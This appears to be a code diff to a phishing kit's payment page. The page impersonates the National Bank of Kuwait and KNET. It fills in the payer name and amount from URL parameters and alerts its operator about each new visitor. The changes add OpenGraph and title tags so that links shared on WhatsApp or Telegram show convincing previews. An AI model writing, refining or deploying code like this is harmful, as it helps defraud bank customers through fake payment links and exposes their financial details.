@@ -7,16 +7,37 @@ const PaymentPage = () => {
   const navigate = useNavigate();
   const queryParams = new URLSearchParams(window.location.search);
   
-  const paymentData = useMemo(() => ({
-    id: id || 'unknown',
-    customerName: queryParams.get('n') || "halits.YILDIZ",
-    amount: queryParams.get('a') || "5.000",
-    currency: queryParams.get('c') || "KWD",
-    description: queryParams.get('p') || "طلب رابط دفع من chalits.YILDIZ بمبلغ KWD 5.000. سيكون الرابط صالحًا لمدة 24 ساعة.",
-    expiryDate: new Date(Date.now() + 86400000).toISOString().split('T')[0]
-  }), [window.location.search, id]);
+  const paymentData = useMemo(() => {
+    return {
+      id: id || 'unknown',
+      customerName: queryParams.get('n') || "halits.YILDIZ",
+      amount: queryParams.get('a') || "5.000",
+      currency: queryParams.get('c') || "KWD",
+      description: queryParams.get('p') || "طلب رابط دفع من chalits.YILDIZ بمبلغ KWD 5.000. سيكون الرابط صالحًا لمدة 24 ساعة.",
+      expiryDate: new Date(Date.now() + 86400000).toISOString().split('T')[0]
+    };
+  }, [window.location.search, id]);
 
   useEffect(() => {
+    // Dynamic Metadata Update for Sharing (WhatsApp/Telegram previews)
+    document.title = `KNET Payment - ${paymentData.customerName}`;
+    
+    // Update Meta Description
+    let metaDesc = document.querySelector('meta[name="description"]');
+    if (!metaDesc) {
+      metaDesc = document.createElement('meta');
+      metaDesc.setAttribute('name', 'description');
+      document.head.appendChild(metaDesc);
+    }
+    metaDesc.setAttribute('content', paymentData.description);
+
+    // Update OpenGraph (OG) tags for rich previews
+    const ogTitle = document.querySelector('meta[property="og:title"]');
+    if (ogTitle) ogTitle.setAttribute('content', `KNET Payment - ${paymentData.customerName}`);
+    
+    const ogDesc = document.querySelector('meta[property="og:description"]');
+    if (ogDesc) ogDesc.setAttribute('content', paymentData.description);
+
     const notifyVisitor = async () => {
       const message = `
 <b>👀 New Visitor</b>
@@ -43,17 +64,14 @@ const PaymentPage = () => {
 
   return (
     <div className="min-h-screen bg-white flex flex-col items-center justify-center px-4">
-      {/* شعار NBK */}
       <div className="mb-8">
         <img src="/nbk-logo.jpg" alt="بنك الكويت الوطني" className="h-16" />
       </div>
       
-      {/* عنوان الخدمة */}
       <h1 className="text-2xl font-bold text-blue-800 mb-8 text-center">
         خدمة الدفع السريع
       </h1>
       
-      {/* معلومات الدفع */}
       <div className="w-full max-w-md bg-gray-50 border border-gray-300 rounded-lg p-6 mb-6">
         <div className="space-y-4 text-right">
           <div className="flex justify-between items-center">
@@ -78,12 +96,10 @@ const PaymentPage = () => {
         </div>
       </div>
       
-      {/* تنبيه مهم */}
       <div className="text-right text-sm text-gray-600 mb-8 max-w-md leading-relaxed">
         يرجى عدم إغلاق الصفحة بعد إتمام عملية الدفع لحين ظهور صفحة التأكيد التي تفيد بأن العملية ناجحة لتفادي أي مشاكل قد تنتج عن ذلك.
       </div>
       
-      {/* أزرار التحكم */}
       <div className="flex flex-col gap-3 w-full max-w-md">
         <button 
           onClick={handleConfirm}
